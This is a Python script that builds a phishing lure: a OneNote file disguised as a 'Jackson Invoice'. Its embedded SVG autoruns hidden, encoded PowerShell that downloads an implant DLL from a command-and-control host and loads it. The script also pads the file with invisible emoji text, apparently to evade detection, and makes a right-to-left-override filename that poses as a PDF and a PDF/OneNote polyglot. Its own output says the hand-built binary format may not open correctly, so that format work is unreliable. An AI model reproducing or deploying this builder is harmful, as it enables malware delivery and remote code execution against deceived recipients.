#!/usr/bin/env python3
import struct
import uuid
import zlib
import time
from datetime import datetime
import hashlib

class AdvancedOneNoteGenerator:
    """
    Advanced OneNote file generator using FSSHTTP-B protocol structures
    """
    
    # OneNote magic numbers and signatures
    ONENOTE_SIGNATURE = b'\xA1\x2F\xFF\x43\x4D\x83\x7F\xE4\x23\x8C\x2A\x4B\xCC\x91\x59\x56'
    
    # Object space types
    OBJECT_SPACE_ROOT = 0x00
    OBJECT_SPACE_DATA = 0x01
    OBJECT_SPACE_FILE_DATA = 0x02
    
    def __init__(self):
        self.buffer = bytearray()
        self.object_groups = []
        
    def write(self, data):
        """Write raw bytes"""
        self.buffer.extend(data)
        
    def write_uint8(self, value):
        """Write 8-bit unsigned integer"""
        self.buffer.extend(struct.pack('<B', value))
        
    def write_uint16(self, value):
        """Write 16-bit unsigned integer"""
        self.buffer.extend(struct.pack('<H', value))
        
    def write_uint32(self, value):
        """Write 32-bit unsigned integer"""
        self.buffer.extend(struct.pack('<I', value))
        
    def write_uint64(self, value):
        """Write 64-bit unsigned integer"""
        self.buffer.extend(struct.pack('<Q', value))
        
    def write_guid(self):
        """Write a new GUID"""
        guid = uuid.uuid4()
        self.write(guid.bytes_le)
        return guid
        
    def write_compact_uint64(self, value):
        """Write compact unsigned 64-bit integer (variable length encoding)"""
        if value < 0x80:
            self.write_uint8(value)
        elif value < 0x4000:
            self.write_uint16((value & 0x3FFF) | 0x8000)
        elif value < 0x20000000:
            self.write_uint32((value & 0x1FFFFFFF) | 0xC0000000)
        else:
            self.write_uint8(0xE0)
            self.write_uint64(value)
            
    def generate_header(self):
        """Generate OneNote file header"""
        # File type signature
        self.write(self.ONENOTE_SIGNATURE)
        
        # File version
        self.write_uint32(0x00000036)  # Version 54
        
        # File format
        self.write_uint32(0x00000000)  # OneNote 2010+ format
        
        # Creation timestamp
        filetime = int((datetime.utcnow().timestamp() + 11644473600) * 10000000)
        self.write_uint64(filetime)
        
        # Root file node list offset
        root_offset_pos = len(self.buffer)
        self.write_uint64(0)  # Will be updated later
        
        # Free space offset
        self.write_uint64(0)
        
        # Transaction log offset
        self.write_uint64(0)
        
        # Hash sections offset
        self.write_uint64(0)
        
        # Reserved
        self.write(b'\x00' * 64)
        
        # File size
        self.write_uint64(0)  # Will be updated
        
        # Header checksum
        self.write_uint32(0)  # Will be calculated
        
        return root_offset_pos
        
    def create_object_group(self, object_type, data):
        """Create an object group"""
        group = {
            'type': object_type,
            'guid': uuid.uuid4(),
            'data': data
        }
        self.object_groups.append(group)
        return group
        
    def generate_page_content(self):
        """Generate page content with invoice and malicious SVG"""
        content = bytearray()
        
        # Property set for page
        # Property ID for title
        content.extend(struct.pack('<I', 0x1C001C04))  # Title property
        content.extend(struct.pack('<I', 0x00000001))  # Type: String
        
        title = "Jackson Invoice"
        title_bytes = title.encode('utf-16-le')
        content.extend(struct.pack('<I', len(title_bytes)))
        content.extend(title_bytes)
        
        # Rich text content
        invoice_html = """<html>
<body style="font-family:Calibri;font-size:11pt">
<h1>Invoice</h1>
<p><b>Jackson Enterprises</b><br/>
123 Business St, Suite 100<br/>
Invoice #INV-2025-001<br/>
Date: June 15, 2025</p>
<p><b>Amount Due: $1,650.45</b></p>
<p>Services Rendered: Consulting Services<br/>
Please remit payment by July 15, 2025</p>
</body>
</html>"""
        
        # Add content property
        content.extend(struct.pack('<I', 0x1C001C05))  # Content property
        content.extend(struct.pack('<I', 0x00000002))  # Type: Rich text
        
        content_bytes = invoice_html.encode('utf-16-le')
        content.extend(struct.pack('<I', len(content_bytes)))
        content.extend(content_bytes)
        
        # Generate malicious SVG
        svg_content = self.generate_malicious_svg()
        
        # Add embedded object property
        content.extend(struct.pack('<I', 0x1C001C10))  # Embedded object
        content.extend(struct.pack('<I', 0x00000003))  # Type: Binary
        
        svg_bytes = svg_content.encode('utf-8')
        content.extend(struct.pack('<I', len(svg_bytes)))
        content.extend(svg_bytes)
        
        return content
        
    def generate_malicious_svg(self):
        """Generate SVG with crab emojis and PowerShell payload"""
        import base64
        
        crab_emoji = "🦀"
        crab_text = crab_emoji * 24000
        
        ps_script = """$url="https://c2.example.com/implant.dll";$c=New-Object System.Net.WebClient;$a=$c.DownloadData($url);[System.Reflection.Assembly]::Load($a).GetType("Implant.Main").GetMethod("Run").Invoke($null,$null)"""
        encoded_ps = base64.b64encode(ps_script.encode('utf-16-le')).decode('ascii')
        
        svg = f"""<svg xmlns="http://www.w3.org/2000/svg" width="300" height="100" onload="autorun()">
<rect width="100%" height="100%" fill="#f0f0f0"/>
<text x="50%" y="50%" text-anchor="middle" font-family="Arial" font-size="20">Company Logo</text>
<text x="0" y="0" font-size="1" opacity="0.001">{crab_text}</text>
<script type="text/javascript"><![CDATA[
function autorun() {{
  try {{
    var s=new ActiveXObject("WScript.Shell");
    s.Run('powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand {encoded_ps}',0,false);
  }} catch(e) {{}}
}}
]]></script>
</svg>"""
        return svg
        
    def build_file_node_list(self, root_offset_pos):
        """Build file node list structure"""
        # File node list header
        file_node_start = len(self.buffer)
        
        # Update root offset in header
        current_pos = len(self.buffer)
        self.buffer[root_offset_pos:root_offset_pos+8] = struct.pack('<Q', current_pos)
        
        # File node list ID
        self.write_uint64(0x00000000000000A4)
        
        # Number of fragments
        self.write_uint32(1)
        
        # Fragment 0 - Page content
        page_content = self.generate_page_content()
        
        # Object declaration
        self.write_uint16(0x0042)  # Object declaration
        self.write_uint24(len(page_content) + 16)  # Size
        
        # Object ID
        self.write_compact_uint64(1)
        
        # GUID
        self.write_guid()
        
        # Data
        self.write(page_content)
        
        # End of file node list
        self.write_uint64(0x00000000000000FF)
        
        return file_node_start
        
    def write_uint24(self, value):
        """Write 24-bit unsigned integer"""
        self.write_uint8(value & 0xFF)
        self.write_uint8((value >> 8) & 0xFF)
        self.write_uint8((value >> 16) & 0xFF)
        
    def calculate_checksum(self):
        """Calculate file checksum"""
        # Skip the checksum field itself
        data_to_hash = self.buffer[:0x3FC] + self.buffer[0x400:]
        return zlib.crc32(data_to_hash) & 0xFFFFFFFF
        
    def finalize(self):
        """Finalize the file"""
        # Update file size
        file_size = len(self.buffer)
        self.buffer[0x108:0x110] = struct.pack('<Q', file_size)
        
        # Calculate and update checksum
        checksum = self.calculate_checksum()
        self.buffer[0x110:0x114] = struct.pack('<I', checksum)
        
    def save(self, filename):
        """Save to file"""
        with open(filename, 'wb') as f:
            f.write(self.buffer)

def main():
    print("Generating advanced OneNote file...")
    
    generator = AdvancedOneNoteGenerator()
    
    # Generate header
    root_offset_pos = generator.generate_header()
    
    # Build file structure
    generator.build_file_node_list(root_offset_pos)
    
    # Finalize
    generator.finalize()
    
    # Save files
    regular_filename = "Jackson_Invoice_Advanced.one"
    generator.save(regular_filename)
    print(f"Generated: {regular_filename} ({len(generator.buffer)} bytes)")
    
    # Create deceptive filename version
    rtlo_char = "\u202E"
    deceptive_filename = f"Jackson_Invoice{rtlo_char}fdp.one"
    generator.save(deceptive_filename)
    print(f"Generated: {deceptive_filename}")
    
    # Also try a hybrid approach - embed in PDF
    print("\nGenerating PDF/OneNote polyglot file...")
    
    # Simple PDF header
    pdf_header = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
217
%%EOF
"""
    
    # Create polyglot file
    polyglot = pdf_header + b'\x00' * 1024 + generator.buffer
    
    polyglot_filename = "Jackson_Invoice_Polyglot.pdf"
    with open(polyglot_filename, 'wb') as f:
        f.write(polyglot)
    print(f"Generated: {polyglot_filename} (PDF/OneNote polyglot)")
    
    print("\nNOTE: These files use experimental binary generation.")
    print("They may not open correctly in all versions of OneNote.")
    print("The most reliable method remains the HTML/manual export approach.")

if __name__ == "__main__":
    main() 